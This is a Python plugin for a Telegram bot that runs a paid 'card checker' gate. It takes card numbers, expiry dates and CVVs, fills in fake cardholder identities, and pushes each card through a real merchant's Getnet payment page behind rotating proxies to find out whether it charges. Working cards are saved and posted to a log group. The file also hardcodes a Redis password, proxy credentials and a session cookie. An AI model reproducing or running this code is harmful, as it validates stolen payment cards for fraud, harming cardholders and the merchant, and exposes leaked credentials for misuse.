import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from defs import *
from pyrogram import Client, filters
import json

@Client.on_message(filters.command(["zn"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)

async def sa(Client, message):
    try:
        started_time = time.time()
        verified_gps = open("groups.txt", "r")
        verified_gps = verified_gps.readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text="""<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Ask For Verification.</b>""",reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>GETNET 6€</b>
<b>○</b> RESULT: <b>CHECKING YOUR INPUT</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
            find = client.bot["main"].find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(f"""<b>Register Yourself To Use Me. Hit /takeme To Register Yourself</b>""")
            elif find['status'] == "F" or find['credits'] == "0":
                await msg.edit_text("""<b>buy paid plan to use this gate hit /buy to see my premium plans</b>""")
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "Free Plan",
                        "role": "Free User",
                        "status": "F",
                        "credits": 0,
                        }
                    }, upsert=False)
            else:
                r = redis.Redis(
                    host="redis-18001.c82.us-east-1-2.ec2.cloud.redislabs.com",
                    port=18001,
                    password="eO00qpZScxQ6u1UsZ32Y94YuZ1J7pGWR",
                )
                antispam_time = int(r.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError("Your Card Is Empty")
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect Or Empty")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                        cc_first_letter = int(cc[0])
                        len_mes = len(mes)
                        if cc_first_letter in [1,2,7,8,9,0]:
                            await msg.edit_text("Your Card Invalid")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short")
                        elif int(len(mes)) not in [2,4] or len_mes == 2 and mes > '12' or len_mes == 2 and mes < '00' or len_mes != 2:
                            await msg.edit_text("Your Card Month Is Incorrect")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2 or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect")
                        elif cc_first_letter == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            req = requests.Session()
                            req.proxies = {
                                "http": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                                "https": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                            }
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card's Bin Is Invalid")   
                            elif(str(message.chat.id) + "\n"in open("bannedbin.txt", "r").readlines()):
                                await msg.edit_text("Your Card's Bin Is Banned")
                            else:
                                bin_data = json.loads(res.text)
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
                                first_name = random_data['results'][0]['name']['first']
                                last_name = random_data['results'][0]['name']['last']
                                street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
                                city = random_data['results'][0]['location']['city']
                                state = random_data['results'][0]['location']['state']
                                zip = random_data['results'][0]['location']['postcode']
                                vendor = bin_data["data"]["vendor"].lower()
                                email = get_email()
                                password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url= 'https://co2offset.atmosfair.de/api/payment/creditcard_url'
                                headers = {
'Accept':'application/json, text/plain, */*',
'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'Content-Type':'application/json;charset=UTF-8',
'Cookie':'JSESSIONID=kpgOXURvc2MgCoTVT6Ys7aOOedSTKHDt016WInFf.jb802',
'Host':'co2offset.atmosfair.de',
'Origin':'https://co2offset.atmosfair.de',
'Referer':'https://co2offset.atmosfair.de/co2offset?p=1',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Linux"',
'Sec-Fetch-Dest':'empty',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Site':'same-origin',
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'}
                                data = '{"amount":6,"parentUrl":"https://www.atmosfair.de/","persistCreditCard":true}'
                                req = res.post(url, data=data , headers=headers)
                                json_text = json.loads(req.text)
                                if 'url' not in json_text:
                                    text = f"""
<b>〄</b> GATE: <b>GETNET 6€</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                else:
                                    url = json_text['url']
                                    id = re.search(r'wPaymentToken=(.*)"}', req.text).group(1)
                                    headers = {
'Accept':'application/json',
'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'Content-Type':'application/json;charset=UTF-8',
'Host':'paymentpage.getneteurope.com',
'Origin':'https://paymentpage.getneteurope.com',
'Referer':url,
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Linux"',
'Sec-Fetch-Dest':'empty',
'Sec-Fetch-Mode':'cors',
'Sec-Fetch-Site':'same-origin',
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
'W-Payment-Token': id,
'X-Requested-With':'XMLHttpRequest',
}
                                    data = '{"periodic":{"sequence-type":"first","periodic-type":"recurring"},"card":{"account-number":"' + cc +'","card-security-code":" ' + cvv + '","card-type":"visa","card-type-selection":"default","expiration-month":"' + mes + '","expiration-year":"' + ano +'"},"account-holder":{"first-name":"' + first_name + '","last-name":"' + last_name + '"},"locale":"en","payment-methods":[{"name":"creditcard"}],"browser":{"screen-resolution":"1366x768","color-depth":24,"timezone":-330,"java-enabled":"false","language":"en-IN"}}'
                                    res = res.post("https://paymentpage.getneteurope.com/api/payment/submit",headers=headers,data=data)
                                    text = f"""
<b>〄</b> GATE: <b>GETNET 6€</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    try:
                                        if res.status_code == requests.codes.ok or 'error' not in url:
                                            await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                            save_live(lista)
                                            response = "APPROVED"
                                            r_logo = "✅"
                                            r_text = "CHARGED £6"
                                        elif "error" in url:
                                            response = "REJECTED"
                                            r_logo = "❌"
                                            r_text = "CARD REJECTED"
                                        else:
                                            response = "NOT SURE"
                                            r_logo = "❗"
                                            r_text = "ERROR"
                                    except Exception as e:
                                        await Client.send_message(chat_id=loggp, text=e)
                                    else:
                                        if response is None:
                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                        else:
                                            credits = find['credits']
                                            credits_left = credits - 2
                                            maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}},upsert=False)
                                            text = f"""
<b>〄</b> GATE: <b>GETNET 6€</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> CREDITS LEFT: {credits_left}credits
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                            await msg.edit_text(text)
                                            r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In za Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
